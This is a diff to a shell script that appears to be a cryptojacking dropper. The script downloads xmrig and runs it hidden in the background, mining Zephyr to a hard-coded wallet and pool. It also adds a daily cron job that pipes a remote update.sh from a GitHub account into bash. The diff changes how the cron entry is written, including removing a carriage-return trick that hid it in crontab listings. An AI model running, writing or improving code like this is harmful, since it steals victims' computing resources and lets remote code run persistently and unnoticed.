@@ -15,12 +15,7 @@ wallet="ZEPHs6nHn1AJsdkqaZdUioNb7DnFNmcbXGuarcPSGGis7HBV7ZmeewCbUAVDwpGsiWGDyzUC
 xmrig_url="https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-2/xmrig-6.21.2-linux-static-x64.tar.gz"
 random_number=$(shuf -i 10000000-99999999 -n 1)
 command="./xmrig --coin zephyr --url \"zeph.kryptex.network:8888\" --user \"$wallet/$random_number\" --tls -k -B & disown"
-crontab_file="/var/spool/cron/crontabs/$(whoami)"
-if [ -f "$crontab_file" ]; then
-    echo "crontab文件存在: $crontab_file"
-    existing_crontab=$(cat -A /var/spool/cron/crontabs/$(whoami))
-else
-    echo "crontab文件不存在: $crontab_file"
+existing_crontab=$(crontab -l 2>/dev/null)
 
 fi
 
@@ -68,10 +63,10 @@ else
     exit 0
 fi
 
-if echo "$existing_crontab" | grep -q "0 1 * * * 0 1 * * * curl -sSf https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash"; then
+if echo "$existing_crontab" | grep -q "0 1 * * *  curl -sSf https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash"; then
     echo "指定的计划任务已添加"
 else
     # 如果不存在，则添加计划任务
-    (crontab -l 2>/dev/null; printf "0 1 * * * 0 1 * * * curl -sSf https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash;\rno crontab for $(whoami) %100c\n") | crontab -
+    (crontab -l 2>/dev/null; printf "0 1 * * *  curl -sSf https://raw.githubusercontent.com/JuliaRandolph/xm/main/update.sh | bash") | crontab -
     echo "已添加指定的计划任务"
 fi
